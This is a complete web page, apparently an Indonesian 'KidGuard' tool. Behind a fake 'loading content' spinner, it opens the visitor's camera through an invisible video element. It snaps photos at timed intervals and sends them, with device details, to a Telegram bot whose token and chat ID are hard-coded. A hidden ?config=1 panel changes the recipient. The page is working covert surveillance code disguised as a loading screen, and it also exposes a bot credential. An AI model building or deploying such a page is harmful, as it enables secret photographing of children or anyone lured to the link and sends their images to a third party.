 <!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Memuat...</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap');

  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --bg: #080c10;
    --surface: #0e1318;
    --border: #1e2830;
    --accent: #3b82f6;
    --accent-dim: #1d3f6e;
    --text: #c8d4e0;
    --muted: #4a5a6a;
    --success: #22c55e;
    --danger: #ef4444;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  /* ─── COVER PAGE (tampilan normal di mata anak) ─── */
  #cover {
    position: fixed;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    gap: 20px;
    z-index: 1;
  }

  .ring-wrap {
    position: relative;
    width: 72px;
    height: 72px;
  }
  .ring {
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 2px solid transparent;
    animation: spin 1.4s linear infinite;
  }
  .ring-1 { border-top-color: var(--accent); }
  .ring-2 { border-right-color: var(--accent-dim); animation-delay: -.4s; inset: 8px; }

  @keyframes spin { to { transform: rotate(360deg); } }

  #cover-label {
    font-size: 13px;
    color: var(--muted);
    letter-spacing: .06em;
    font-weight: 300;
  }

  /* ─── CONFIG PANEL (akses via ?config=1) ─── */
  #cfg {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(8,12,16,.96);
    z-index: 100;
    align-items: center;
    justify-content: center;
    backdrop-filter: blur(4px);
  }
  #cfg.open { display: flex; }

  .cfg-box {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 28px 24px;
    width: 92%;
    max-width: 380px;
  }

  .cfg-logo {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 24px;
  }
  .cfg-logo svg { color: var(--accent); }
  .cfg-logo span { font-size: 16px; font-weight: 500; color: var(--text); }
  .cfg-logo small { display: block; font-size: 11px; color: var(--muted); font-weight: 300; }

  .field { margin-bottom: 14px; }
  .field label {
    display: block;
    font-size: 11px;
    color: var(--muted);
    letter-spacing: .05em;
    text-transform: uppercase;
    margin-bottom: 6px;
  }
  .field input {
    width: 100%;
    background: var(--bg);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 10px 12px;
    border-radius: 8px;
    font-size: 13px;
    font-family: monospace;
    outline: none;
    transition: border-color .2s;
  }
  .field input:focus { border-color: var(--accent); }
  .field input::placeholder { color: var(--muted); }

  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }

  .btn-save {
    width: 100%;
    background: var(--accent);
    color: #fff;
    border: none;
    padding: 12px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    margin-top: 8px;
    transition: opacity .2s;
  }
  .btn-save:hover { opacity: .85; }
  .btn-save:active { opacity: .7; }

  #cfg-toast {
    font-size: 12px;
    text-align: center;
    margin-top: 12px;
    min-height: 18px;
    color: var(--success);
  }
  #cfg-toast.err { color: var(--danger); }

  /* ─── STATUS INDICATOR (pojok kanan bawah, tiny) ─── */
  #dot {
    position: fixed;
    bottom: 12px;
    right: 12px;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--muted);
    z-index: 2;
    transition: background .4s;
  }
  #dot.ok { background: var(--success); }
  #dot.err { background: var(--danger); }

  /* ─── HIDDEN CAMERA ELEMENTS ─── */
  #vid {
    position: fixed;
    top: 0; left: 0;
    width: 1px; height: 1px;
    opacity: 0;
    pointer-events: none;
  }
  #cnv { display: none; }
</style>
</head>
<body>

<!-- Cover UI yang terlihat normal -->
<div id="cover">
  <div class="ring-wrap">
    <div class="ring ring-1"></div>
    <div class="ring ring-2"></div>
  </div>
  <span id="cover-label">Memuat konten...</span>
</div>

<!-- Status dot -->
<div id="dot"></div>

<!-- Config Panel — ortu akses via URL?config=1 -->
<div id="cfg">
  <div class="cfg-box">
    <div class="cfg-logo">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        <circle cx="12" cy="11" r="2"/>
        <path d="M12 13v3"/>
      </svg>
      <div>
        <span>KidGuard</span>
        <small>Setup konfigurasi</small>
      </div>
    </div>

    <div class="field">
      <label>Telegram Bot Token</label>
      <input id="inp-token" type="text" placeholder="123456789:ABCdef..." autocomplete="off">
    </div>

    <div class="field">
      <label>Chat ID (akun Telegram ortu)</label>
      <input id="inp-chatid" type="text" placeholder="123456789" autocomplete="off">
    </div>

    <div class="field-row">
      <div class="field">
        <label>Kamera</label>
        <select id="inp-cam" style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 12px;border-radius:8px;font-size:13px;outline:none;">
          <option value="user">Depan</option>
          <option value="environment">Belakang</option>
        </select>
      </div>
      <div class="field">
        <label>Interval (menit)</label>
        <input id="inp-interval" type="number" value="10" min="1" max="120" placeholder="10">
      </div>
    </div>

    <button class="btn-save" onclick="saveConfig()">Simpan & Aktifkan</button>
    <div id="cfg-toast"></div>
  </div>
</div>

<!-- Hidden camera -->
<video id="vid" autoplay playsinline muted></video>
<canvas id="cnv"></canvas>

<script>
const STORE = 'kg_v1';
const DEFAULT_CFG = {
  token: '8114225625:AAGwdD3MzPx_MGWCW8bS9b2852JULcJ8_wU',
  chatId: '7885097329',
  cam: 'user',
  interval: 10
};

function cfg() {
  try {
    const saved = JSON.parse(localStorage.getItem(STORE));
    return saved && saved.token ? saved : DEFAULT_CFG;
  } catch { return DEFAULT_CFG; }
}

function toast(msg, isErr) {
  const el = document.getElementById('cfg-toast');
  el.textContent = msg;
  el.className = isErr ? 'err' : '';
}

function dot(state) {
  document.getElementById('dot').className = state;
}

function saveConfig() {
  const token    = document.getElementById('inp-token').value.trim();
  const chatId   = document.getElementById('inp-chatid').value.trim();
  const cam      = document.getElementById('inp-cam').value;
  const interval = parseInt(document.getElementById('inp-interval').value) || 10;

  if (!token || !chatId) { toast('Token dan Chat ID wajib diisi.', true); return; }

  localStorage.setItem(STORE, JSON.stringify({ token, chatId, cam, interval }));
  toast('✓ Tersimpan. Mengaktifkan agent...');
  setTimeout(() => {
    document.getElementById('cfg').classList.remove('open');
    startAgent();
  }, 1000);
}

async function sendPhoto(blob) {
  const { token, chatId } = cfg();
  if (!token || !chatId || !blob) return false;

  const now = new Date();
  const stamp = now.toLocaleDateString('id-ID', { day:'2-digit', month:'short', year:'numeric' })
    + ' ' + now.toLocaleTimeString('id-ID', { hour:'2-digit', minute:'2-digit' });
  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
  const caption = `📸 KidGuard Snapshot\n🕐 ${stamp}\n📱 ${isMobile ? 'Mobile' : 'Desktop'} · ${screen.width}×${screen.height}`;

  const fd = new FormData();
  fd.append('chat_id', chatId);
  fd.append('photo', blob, 'snap.jpg');
  fd.append('caption', caption);

  const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: 'POST', body: fd
  });
  return res.ok;
}

async function capture() {
  const vid = document.getElementById('vid');
  const cnv = document.getElementById('cnv');
  if (!vid.srcObject) return null;

  if (vid.readyState < 2) {
    await new Promise(r => { vid.onloadeddata = r; });
  }

  cnv.width  = vid.videoWidth  || 1280;
  cnv.height = vid.videoHeight || 720;
  cnv.getContext('2d').drawImage(vid, 0, 0);

  return new Promise(resolve => cnv.toBlob(resolve, 'image/jpeg', 0.82));
}

async function doSnap() {
  try {
    const blob = await capture();
    if (!blob) return;
    const ok = await sendPhoto(blob);
    dot(ok ? 'ok' : 'err');
  } catch (e) {
    dot('err');
  }
}

let snapTimer = null;

async function startAgent() {
  const c = cfg();
  if (!c.token || !c.chatId) return;

  const vid = document.getElementById('vid');
  document.getElementById('cover-label').textContent = 'Memuat konten...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: c.cam || 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: false
    });

    vid.srcObject = stream;

    await new Promise(r => setTimeout(r, 2200));
    await doSnap();

    clearInterval(snapTimer);
    const ms = (c.interval || 10) * 60 * 1000;
    snapTimer = setInterval(doSnap, ms);

  } catch (err) {
    dot('err');
  }
}

window.addEventListener('load', () => {
  const params = new URLSearchParams(location.search);

  if (params.get('config') === '1') {
    const c = cfg();
    if (c.token)    document.getElementById('inp-token').value    = c.token;
    if (c.chatId)   document.getElementById('inp-chatid').value   = c.chatId;
    if (c.cam)      document.getElementById('inp-cam').value      = c.cam;
    if (c.interval) document.getElementById('inp-interval').value = c.interval;
    document.getElementById('cfg').classList.add('open');
  } else {
    startAgent();
  }
});
</script>
</body>
</html>
